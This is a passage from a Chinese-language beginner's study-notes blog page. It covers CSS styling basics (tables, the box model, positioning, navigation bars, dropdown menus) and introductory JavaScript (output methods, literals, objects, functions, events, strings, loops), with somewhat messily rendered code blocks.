class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>.<span class="hljs-string">a</span>&#123;<span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">circle</span>;&#125;圆点状列表标记<br>.<span class="hljs-string">b</span>&#123;<span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">square</span>;&#125;方形列表标记<br><span class="hljs-string">none</span>就是无标记<br></code></pre></td></tr></table></figure><p>也可指定图像，进行标记</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>&#123;<br>    <span class="hljs-built_in">list-style-image:</span> <span class="hljs-string">url</span>(<span class="hljs-string">&quot;a.jpg&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS3表格美化"><a href="#CSS3表格美化" class="headerlink" title="CSS3表格美化"></a>CSS3表格美化</h3><p>表格边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span><br>&#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br>此时会显示双边框，如果想只显示单边框<br><span class="hljs-attribute">border-collapse</span>: collapse;<br>即可<br></code></pre></td></tr></table></figure><p>表格高、宽、文字对齐</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">text-align</span>: right;水平方向对齐<br>    <span class="hljs-attribute">vertical-align</span>: bottom;竖直方向对齐<br>&#125;<br></code></pre></td></tr></table></figure><p>表格填充<br>控制边框和表格内容之间的间距，使用td与th元素的填充属性:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">td</span>&#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;<br>&#125;<br>会使表格更大更易于观察<br></code></pre></td></tr></table></figure><h3 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h3><p><img src="/2022/06/30/front/p3.jpg"><br><strong>Margin:外边距<br>Border:边框<br>Padding:内边距<br>Content:内容</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">25px</span> solid green;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">25px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">25px</span>;<br>    //一共是<span class="hljs-number">450px</span>的宽度<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS边框Border"><a href="#CSS边框Border" class="headerlink" title="CSS边框Border"></a>CSS边框Border</h3><p>border-style属性：<br>none：无边框<br>solid：实线边框<br>等等<br>**border-width:边框宽度<br>border-color:边框颜色<br>border-top-style:顶框样式<br>等等<br>**<br>p.one{<br>    border-style: solid;<br>    border-width: 5px;<br>    border-color: red;<br>}</p><h3 id="CSS轮廓outline"><a href="#CSS轮廓outline" class="headerlink" title="CSS轮廓outline"></a>CSS轮廓outline</h3><p>轮廓是绘制于元素周围的一条线，位于边框边缘的外围</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">outline-color</span><br><span class="hljs-attribute">outline-style</span><br><span class="hljs-attribute">outline-width</span><br></code></pre></td></tr></table></figure><h3 id="CSS外边距margin"><a href="#CSS外边距margin" class="headerlink" title="CSS外边距margin"></a>CSS外边距margin</h3><p>margin用于清除周围的元素区域。margin没有背景颜色，完全透明。</p><h3 id="CSS填充padding"><a href="#CSS填充padding" class="headerlink" title="CSS填充padding"></a>CSS填充padding</h3><p>padding设置元素内，文本内容与边框之间的距离</p><h3 id="CSS内隐藏元素"><a href="#CSS内隐藏元素" class="headerlink" title="CSS内隐藏元素"></a>CSS内隐藏元素</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden</span>&#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden1</span>&#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br>注意，前者只是看不见，但占空间<br>后者是不占空间<br></code></pre></td></tr></table></figure><h3 id="CSS定位position"><a href="#CSS定位position" class="headerlink" title="CSS定位position"></a>CSS定位position</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.p_fixed</span>&#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>&#125;<br>会使元素位置相对于浏览器窗口是固定位置<br></code></pre></td></tr></table></figure><h3 id="CSS溢出文本的处理Overflow"><a href="#CSS溢出文本的处理Overflow" class="headerlink" title="CSS溢出文本的处理Overflow"></a>CSS溢出文本的处理Overflow</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">overflow: visible元素不被修剪，呈现于元素框外面<br>overflow: hidden元素被剪掉<br>overflow：scroll（<span class="hljs-keyword">auto</span>）元素被剪掉，但可以用滚动条查看剩余内容。<br></code></pre></td></tr></table></figure><h3 id="CSS元素的浮动"><a href="#CSS元素的浮动" class="headerlink" title="CSS元素的浮动"></a>CSS元素的浮动</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span>&#123;<br>    <span class="hljs-attribute">float</span>: right;<br>&#125;<br>则该图片会显示在网页的右侧，而其余元素会包围它出现<br><br></code></pre></td></tr></table></figure><p>如：<br>这是参数为left时<br><img src="/2022/06/30/front/p4.png"><br>而以下为参数是right时<br><img src="/2022/06/30/front/p5.png"></p><h3 id="CSS对齐"><a href="#CSS对齐" class="headerlink" title="CSS对齐"></a>CSS对齐</h3><p>元素居中对齐：<br>先设置元素宽度<code>width</code>属性，再</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span>&#123;<br>    <span class="hljs-attribute">margin</span>: auto;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid red;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><span class="hljs-attribute">margin</span>: auto;即可使元素水平居中<br><span class="hljs-attribute">text-align</span>: center;<br>是文本居中<br><br></code></pre></td></tr></table></figure><p>而垂直居中，则设置行间距与高度height相等</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid green;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br> <br><span class="hljs-comment">/* 如果文本有多行，添加以下代码: */</span><br><span class="hljs-selector-class">.center</span> <span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.5</span>;<br>    <span class="hljs-attribute">display</span>: inline-block;<br>    <span class="hljs-attribute">vertical-align</span>: middle;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS伪元素"><a href="#CSS伪元素" class="headerlink" title="CSS伪元素"></a>CSS伪元素</h3><p>:first-line伪元素</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-line<br>&#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-variant</span>: small-caps;<br>&#125;<br>first-line伪元素只用于块级元素<br></code></pre></td></tr></table></figure><p>before/after伪元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">用于在元素后面或前面添加东西，如在每个&lt;<span class="hljs-selector-tag">h2</span>&gt;前面添加图片<br><span class="hljs-selector-tag">h2</span><span class="hljs-selector-pseudo">:before</span>&#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;a.jpg&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS导航栏的制作"><a href="#CSS导航栏的制作" class="headerlink" title="CSS导航栏的制作"></a>CSS导航栏的制作</h3><p>第一步：使用无序列表，元素为a标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><p>再删除列表前的点，删除边距与填充</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>&#123;<br>           <span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">none</span>;<br>           <span class="hljs-string">padding</span>: <span class="hljs-string">none</span>;<br>           <span class="hljs-string">margin</span>: <span class="hljs-string">none</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p>给链接元素转换为块元素<br>并设置宽度（默认为最大，需要设置）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>&#123;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进一步设置，鼠标移动到导航栏上后，修改颜色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#555</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br></code></pre></td></tr></table></figure><p>添加active类，被选中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.active</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br>注意，不是:而是.<br>因为这里，是标记出当前页面所在的选项，而不是正在选择<br></code></pre></td></tr></table></figure><p>加上边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#555</span>;<br>&#125;<br> <br><span class="hljs-selector-tag">li</span> &#123;<br>    <span class="hljs-attribute">text-align</span>: center;<br>    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#555</span>;<br>&#125;<br> <br><span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;<br>    <span class="hljs-attribute">border-bottom</span>: none;<br>&#125;<br></code></pre></td></tr></table></figure><p>成为全屏高度的固定导航条</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span>&#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">25%</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br>    <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS导航栏2–水平导航栏"><a href="#CSS导航栏2–水平导航栏" class="headerlink" title="CSS导航栏2–水平导航栏"></a>CSS导航栏2–水平导航栏</h3><p>使用内联（inline）或浮动（float）的列表项。<br><strong>内联列表项</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span><br>&#123;<br>    <span class="hljs-attribute">display</span>: inline;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS下拉菜单"><a href="#CSS下拉菜单" class="headerlink" title="CSS下拉菜单"></a>CSS下拉菜单</h3><p>当鼠标移动到指定元素上时，会出现下拉菜单</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.dropdown</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.dropdown-content</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: none;</span><br><span class="language-css">  <span class="hljs-attribute">position</span>: absolute;</span><br><span class="language-css">  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f9f9f9</span>;</span><br><span class="language-css">  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">160px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0px</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-number">0px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>);</span><br><span class="language-css">  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">16px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.dropdown</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-class">.dropdown-content</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>[mycode3]<br>[mycode3 type=&quot;html&quot;]<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>鼠标移动到我这！<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-content&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>菜鸟教程<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>www.runoob.com<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="JS的用法"><a href="#JS的用法" class="headerlink" title="JS的用法"></a>JS的用法</h3><p>js代码必须位于HTML中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs <script>```与```</script>```之间">通常，我们需要在某个事件发生时执行代码，比如当用户点击按钮时。<br>如果我们把 JavaScript 代码放入函数中，就可以在事件发生时调用该函数。<br>### JS的输出<br>JS没有任何打印或者输出的函数<br>**JS显示数据**<br>window.alert()<br><br>弹出警告窗口<br></code></pre></td></tr></table></figure><script>window.alert(5+6);</script><p>会弹出11的窗口</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>操作HTML元素<br>document<span class="hljs-selector-class">.getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>)<span class="hljs-selector-class">.innerHTML</span> = <span class="hljs-string">&quot;段落已修改&quot;</span><br>这个是按id查找元素，并进行操作的方法<br></code></pre></td></tr></table></figure><p id="demo">段落1</p><script>document.getElementById("demo").innerHTML = "段落已修改"</script>会显示“段落已修改”<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">直接写入<span class="hljs-selector-tag">HTML</span>文档<br></code></pre></td></tr></table></figure>document.write(Date());<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">会额外输出<span class="hljs-built_in">write</span>内的内容<br>**写到控制台**<br></code></pre></td></tr></table></figure>console.log(message)会输出内容到控制台<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS字面量<br>**数字字面量**<br></code></pre></td></tr></table></figure>3.141001123e5<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**字符串字面量**</span><br>单双引号皆可<br></code></pre></td></tr></table></figure>"jobe d"'lddd sd'<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**表达式字面量**</span><br></code></pre></td></tr></table></figure>7+102 * 8<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**数组字面量**</span><br></code></pre></td></tr></table></figure>[40, 100, 200]<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**对象字面量**</span><br></code></pre></td></tr></table></figure>{firstname:"John", lastname:"Done"}<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**函数字面量**</span><br></code></pre></td></tr></table></figure>function myFunc(am,bm){    return a+b;}<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">**JS变量**</span><br>用<span class="hljs-keyword">var</span>定义<br></code></pre></td></tr></table></figure>var x, length；<p>x = 5；<br>length = 6；</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">**JS注释**<br>双斜杠```//```<br>**且JS大小写敏感**<br>### JS语句<br></code></pre></td></tr></table></figure><p>可以用分号结尾一句代码<br>可以多写空格，提高可读性</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS数据类型和对象<br>new关键字指定类型<br></code></pre></td></tr></table></figure><p>var x=  new Number<br>var ca= new String<br>var fl= new boolean</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**对象**</span><br>对象有<span class="hljs-strong">**属性**</span>和<span class="hljs-strong">**方法**</span><br></code></pre></td></tr></table></figure><p>定义一个对象</p><p>var car = { name: “Fiat”, model:500, color: “white” };<br>每个值用name: value表示，值之间用逗号分割</p><p>访问对象属性</p><p>car.name<br>car[“color”]<br>两种方式均可</p><p>对象方法<br>创建对象：<br>var person{<br>    name:”DAvid”,<br>    lasy:”DAAA”,<br>    methodName:function(){<br>    return name + “ “ + lasy<br>    }<br>}<br>即在类内定义好了方法<br>调用：<br>person.methodName()<br>即可</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS函数<br>定义函数<br></code></pre></td></tr></table></figure><p>function funcname(var1,var2){<br>    //执行代码<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">不用声明参数的数据类型<br>### JS事件<br>#### HTML事件<br>如：HTML页面完成加载<br>HTML input字段发生改变<br>HTML按钮被点击<br>当发生事件时，可以用JS做些事情，语法如下<br></code></pre></td></tr></table></figure><some-HTML-element some-event="JavaScript 代码">如：<button onclick="this.innerHTML=Date()">现在的时间是</button>代码将修改自身元素的内容  this.innerHTML可以达到效果<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">常见的<span class="hljs-selector-tag">HTML</span>事件<br></code></pre></td></tr></table></figure><p>onchange HTML元素改变<br>onclick 点击HTML元素<br>onmouseover 鼠标移动到元素上</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS字符串<br>可以用索引位置，从<span class="hljs-number">0</span>开始访问字符<br></code></pre></td></tr></table></figure><p>var charn = str[9]</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">字符串中的引号，不要跟字符串的引号相同，一双一单<br><span class="hljs-strong">**字符串长度**</span><br></code></pre></td></tr></table></figure><p>var txt = “ABNCNJMMMM”<br>var num = txt.length;<br>length是内置属性</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**字符串可以是对象**</span><br></code></pre></td></tr></table></figure><p>var fristname=new String(“bob”)<br>typeof fristname // return String</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">String可以用```+```链接起来<br>数字与字符串相加，将数字自动转换为字符串后，返回字符串<br></code></pre></td></tr></table></figure><p>z = “hello” + 5<br>hello5</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS条件语句<br>与C++一样<br>switch也一样<br><br>### JS for循环<br></code></pre></td></tr></table></figure><p>for (var i=0;i&lt;cars.length;i++)<br>{<br>    document.write(cars[i] + “<br>“);<br>}</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">也与C</span>++<span class="hljs-comment">一样，只是第一个参数是var定义的变量</span><br><span class="hljs-comment">for</span>--<span class="hljs-comment">in循环</span><br></code></pre></td></tr></table></figure><p>var person = {fname:”boll”, lname:”vil”, age:56};<br>for(x in person)<br>{<br>    txt = txt + person[x];<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS类型转换<br></code></pre></td></tr></table></figure><p>var a<br>a=String(123)<br>var b<br>b = Number(“3.14”)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS正则表达式（RE）<br>如<br></code></pre></td></tr></table></figure><p>var patt = /runoob/i</p><figure class="highlight 